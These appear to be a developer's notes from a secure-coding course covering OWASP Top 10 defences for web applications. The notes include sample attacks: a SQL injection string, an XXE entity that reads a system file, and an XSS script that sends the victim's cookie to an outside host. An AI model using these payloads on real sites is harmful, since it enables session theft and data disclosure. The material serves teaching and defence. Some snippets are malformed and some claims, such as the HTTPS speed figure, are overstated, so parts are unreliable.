# Secure Coding Practices
This is an Alaska Airlines course on 12.17.18, and goes through good, secure coding practices, specifically designed for web developers.

## Takeaways: 
- Test/scan every single day - test before it's too late
- Make your entire website or webserver HTTPS
- HSTS
  - Force the browser to alawys use HTTPS and preload
- Look into certificate transparency
  - Support as soon as possible
- Enable certificate authority authorization
- Keep updated

## A1: Injections
The most common form of exploit is SQL injections. The best way to protect against that is to use parameterized queries, because even valid data can be exploited. An example of a bad sql request:
```js
let email = `'jim'or'1'!=test@test.com`; // valid email!
let sql = `select * from sensitive_information where email = ${email}`;
```
When this is queried, it will see that 1 will **never** be equal to `test`, and since it's in an `or` statement, this will fire and get data back when it shouldn't.

### Solution: Parameterized Queries
```js
// This is a Nodejs example
let sql = `select * from sensitive_information where email = ?`;
let name = req.params.name; // get the name from the request
db.query(sql, [name]).then(...);
```

## A3: Sensitive Data Exposure
**ALWAYS** use `https` over `http`. It's more secure, it's encrypted, and if it's well configured, `https` can run 800-1000% faster than `http`.

### Transport Layer Protection (HTTPS)
**Protect multiple appropriate mechanisms**
- Use TLS on all connections. Do not tolerate plaintext communication
- Use HSTS (HTTP Strict Transport Securiy) and preloading
- Individually excrypt messages before transmission
  - JSON web encryption
- Sign messages before transmission

**Use the mechanisms correctly**
- Use the standard strong algorithms (disable old SSL algs)
- Manage keys/certs properly
- Verify TLS certs before using them
- Use proven mechanisms when sufficient

### Cryptographic Storage
**Verify your architecture**
- Identify all sensitive data and all the places that data is stored
- Ensure threat model accounts for possible attacks
- Use encryption to counter the threats, don't just 'encrypt' the data

**Protect with appropriate mechanisms**
- File encryption, database encryption, data element encryption

**Use a form of secrets meanagement to protect application secrets**
- Azure KeyVault

## A4: XML External Entity (XXE)
XML eXternal Entity injection (XXE), which is now part of the OWASP Top 10, is a type of attack against an application that parses XML input.

This attack occurs when untrusted XML input containing a reference to an external entity is processed by a weakly configured XML parser.

This attack may lead to the disclosure of confidential data, denial of service, Server Side Request Forgery (SSRF), port scanning from the perspective of the machine where the parser is located, and other system impacts. The following guide provides concise information to prevent this vulnerability. More information can be found [here](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet).
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo any>
  <!ENTITY xxe SYSTEM "file:///etc/password">
]>
```

### Solution: Turn off many XML features

### SQL Integrated Access Control
Example feature: `https://mail.example.com/viewMessage?msgid=123456`  

Someone would be able to write a script in 5 minutes to use all kinds of IDs in the request in a web request. Here, we need to have good access control design.

Ensure the owner is referenced in the query:
```sql
select * from messages where messageid = 123456 and messages.message_owner = <userid_from_session>
```

## A7: Cross Site Scripting (XSS)
This is a prolific problem, and there's no real good solution to it - according to that guy. The problem is that web standards create this issue.

Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user. Flaws that allow these attacks to succeed are quite widespread and occur anywhere a web application uses input from a user within the output it generates without validating or encoding it.

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

### Reflected XSS
Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user’s browser. The browser then executes the code because it came from a "trusted" server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.

### XSS Attack: Cookie Theft
```html
<!-- This would take the user's cookie -->
<script>
var badURL = `https://manicode.com?data=' + uriEncode(document.cookie'`;
var img = new Image();
img.src = badURL;
</script>
```

#### XSS Cookie Theft Defense
Use an HTTPOnly cookie - JavaScript can't read this.

### Stored XSS: Same Site Request Forgery
Because you're already logged in, the cookies are already there and attached there. Attackers don't need to steal the cookies - they just need to **use** it. This **completely** bypasses the safe use of cookies method. It's as if the client ran this code themselves. 

### XSS Defense
**XSS Defense Principles**
- Assume all variables added to a UI are dangerous
- Ensure **all variables and content** dynamically added to a ui are protected from XSS in some way **at the UI layer itself**
- Do not depend on server-side protections (validation) to protect you from XSS
- Be wary of developers disabling framework features that provide automatic XSS defense, like React's `dangerouslySetInnerHTML()` or Angular's `bypasSecurityTrustAs()`

**Clean everything!**  
- Turn `<` into `&lt;`
- There are different contexts to encode for. This includes HTML tag elements, HTML attributes, URL encoding, etc
- It's very important to make sure that URLs are properly checked for their schemas because we do not want to read a JavaScript link - that runs js code which is basically the end of times for web apps.

**XSS Defense Table**
| Data type | Context   | Code Sample                   | Defense
| --------- | --------  | ----------------------------- | -------
| String    | HTML body | `<span>UNTRUSTED DATA</span>` | [HTML Entity Encoding](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.231_-_HTML_Escape_Before_Inserting_Untrusted_Data_into_HTML_Element_Content) |
| String | Safe HTML Attributes | `<input type="text" name="fname" value="UNTRUSTED DATA">` | [Aggressive HTML Entity Encoding](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.232_-_Attribute_Escape_Before_Inserting_Untrusted_Data_into_HTML_Common_Attributes), Only place untrusted data into a whitelist of safe attributes, Strictly validate unsafe attributes such as background, id and name.
| String | GET Parameter | `<a href="/site/search?value=UNTRUSTED DATA">clickme</a>` | [URL Encoding](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.235_-_URL_Escape_Before_Inserting_Untrusted_Data_into_HTML_URL_Parameter_Values)
| String | Untrusted URL in a SRC or HREF attribute | `<a href="UNTRUSTED URL">clickme</a> <iframe src="UNTRUSTED URL" />` | Canonicalize input, URL Validation, Safe URL verification, Whitelist http and https URL's only, [Avoid the JavaScript Protocol to Open a new Window](https://www.owasp.org/index.php/Avoid_the_JavaScript_Protocol_to_Open_a_new_Window), Attribute encoder
| String | CSS Value | `<div style="width: UNTRUSTED DATA;">Selection</div>` | [Strict structural validation](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.234_-_CSS_Escape_And_Strictly_Validate_Before_Inserting_Untrusted_Data_into_HTML_Style_Property_Values), CSS Hex encoding, Good design of CSS Features
| String | JavaScript Variable | `<script>var currentValue='UNTRUSTED DATA';</script><script>someFunction('UNTRUSTED DATA');</script>` | Ensure JavaScript variables are quoted, JavaScript Hex Encoding, JavaScript Unicode Encoding, Avoid backslash encoding (\" or \' or \\)
| HTML | HTML Body | `<div>UNTRUSTED HTML</div>` | [HTML Validation (JSoup, AntiSamy, HTML Sanitizer)](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#RULE_.236_-_Use_an_HTML_Policy_engine_to_validate_or_clean_user-driven_HTML_in_an_outbound_way) |
| String | DOM XSS | `<script>document.write("UNTRUSTED INPUT: " + document.location.hash);<script/>` | [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet)


## A8: Insecure Deserialization
Serialization is the process of turning some object into a data format that can be restored later. People often serialize objects in order to save them to storage, or to send as part of communications. Deserialization is the reverse of that process -- taking data structured from some format, and rebuilding it into an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.

However, many programming languages offer a native capability for serializing objects. These native formats usually offer more features than JSON or XML, including customizability of the serialization process. Unfortunately, the features of these native deserialization mechanisms can be repurposed for malicious effect when operating on untrusted data. Attacks against deserializers have been found to allow denial-of-service, access control, and remote code execution attacks.

**2016 was the year of Java Deserialization apocalypse**
- Known vector since 2011 which allows RCE!
- Previous lack of good RCE gadgets in common libraries
- Apache Commons-Collections Gadgets caught many off-guard

### Solution: Go through JSON schema security

## A9: Using Known Vulnerable Components
Some 3rd party libraries are not secure and are easy to exploit. The biggest example was a remote execution attack to Equifax in 2017. This was the biggest breach in history. 

## Dangerous JavaScript
There are some js functions that are insanely dangerous to run and to let users put in their own value to those.

**Dangerous**
```js
document.write();
element.innerHTML();
```

**Safe**
```js
elem.textContent = dangerousVariable;
elem.className = dangerousVariable;
form.value = dangerousVariable
```

In the same regard, many jQuery functions are also very dangerous because some functions write directly to the DOM, which means bad js can run.

### Using Safe Functions Safely
`someoldpage.aspx - UNSAFE`. It's safe in the browser, but not on the server because it's an asp page.
```html
<script>
var elem = document.getElementById('elementId');
elem.textContent = '?????????';
</script>
```

`someoldpage.js - SAFE`
```js
function(elem, data) {
  elem.textContent = data;
}
```

## Passwords

### Do Not Limit the Password Strength
- Limiting passwords to protect against injection is **doomed to failure**
- Use **query parameterization** and other defenses

### Use a Modern Password Policy Scheme
- Consider...

### Special Publication 800-63-3: Digital AuthN Guidelines
**Favor the user**: To begin, make your password policies *user friendly* and put the *burden on the verifier* when possible
- Do not limit the characters or length of passwords
- At least 8 characters and allow up to 64 (16+ better)
  - Use MFA if the min is 8 characters
- Block passwords that contain dictionary words
- Block passwords that contain repetition like 'aaaaaa'
- Block context-specific passwords like the username or service name
- Check against a list of common and breached username/passwords
- Throttle or otherwise manage brute force attacks (for example, use bcrypt to make it take 2 seconds)
- Don't force unnatural password special character rules
- Don't use password security questions or hints
- No more mandatory password expiration for the sake of it
- Allow all printable ASCII characters including spaces, and should accept all UNICODE characters, including emoji

### Password Storage
Use a slow hashing algorithm, like bcrypt, which is an adaptive, slow algorithm. Basically what we did in server-side.

### Credential Stuffing Safeguards
Credential stuffing is the automated injection of breached username/password pairs in order to fraudulently gain access to user accounts. This is a subset of the brute force attack category: large numbers of spilled credentials are automatically entered into websites until they are potentially matched to an existing account, which the attacker can then hijack for their own purposes.

Credential stuffing is a new form of attack to accomplish account takeover through automated web injection. Credential stuffing is related to the breaching of databases; both accomplish account takeover. Credential stuffing is an emerging threat.

Credential stuffing is dangerous to both consumers and enterprises because of the ripple effects of these breaches. For more information on this please reference the Examples section showing the connected chain of events from one breach to another through credential stuffing.

**Stuffing Live Defense**
- **Block use of known username/password pairs from past breaches**
- Implement multi factor authentication
- Consider avoiding email addresses for usernames

**3rd Party Password Breach Response**
- **Scan for use of known username/password pairs from new breach against entire existing userbase**
- Immediately invalidate user of existing username/password pairs
- Force password reset on affected users

### Solution: Retire old vulnerable packages
Seriously, retire those old ass punks.

## Cross Site Request Forgery
Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

### CSRF Defense
1. Synchronizer Token Pattern
    - "Hidden" token in HTML
    - At login time, generate random CSRF protection. This token value should be stored in the users session
    - Add the CSRF token from session to each sensitive form or url that you deliver to users
    ```html
    <form action="/transfer.do" method="post">

    <input type="hidden" name="CSRFToken" 
    value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">
    ```
2. Double Cookie Submit Defense
    - Stateless CSRF and REST - the client-server communication is constrained by no client context being stored on the server between requests. Each request contains all the information.
    - If maintaining the state for CSRF token at server side is problematic, an alternative defense is to use the double submit cookie technique. This technique is easy to implement and is stateless. In this technique, we send a random value in both a cookie and as a request parameter, with the server verifying if the cookie value and request value match. When a user visits (even before authenticating to prevent login CSRF), the site should generate a (cryptographically strong) pseudorandom value and set it as a cookie on the user's machine separate from the session identifier. The site then requires that every transaction request include this pseudorandom value as a hidden form value (or other request parameter/header). If both of them match at server side, the server accepts it as legitimate request and if they don’t, it would reject the request.
3. Challenge-response: CSRF Defense Option
    - Re-autenticate on sensitive actions
4. CSRF Header Verification Defense
    - Check ORIGIN request header against actual domain
      - Match: good request
      - Wrong: - bad request
      - Missing: check referrer instead
    - Check root of REFERRER request header against actual domain
      - Match: good request
      - Wrong: bad request
      - Missinf: inform user and fail gracefully (rare)

## SSL (Secure Socket Layer)
We should not be using SSL at all since they're all easily bypassable.

## TLS (Transport Layer Security)
- Confidentiality: Spay cannot view your data
- Integrity: Spy cannot change your data
- Authenticity: Server you are visiting is the right one, backed up by the certificate authority system
- HTTPS / TLS should be used everywhere and always

## HSTS (HTTP Strict Transport Security)
- Released in November 2012
- Mitigates
  - Downgrade to HTTP attacks
  - MitM attack using DNS trickery
  - Browser default behavior of trying HTTP first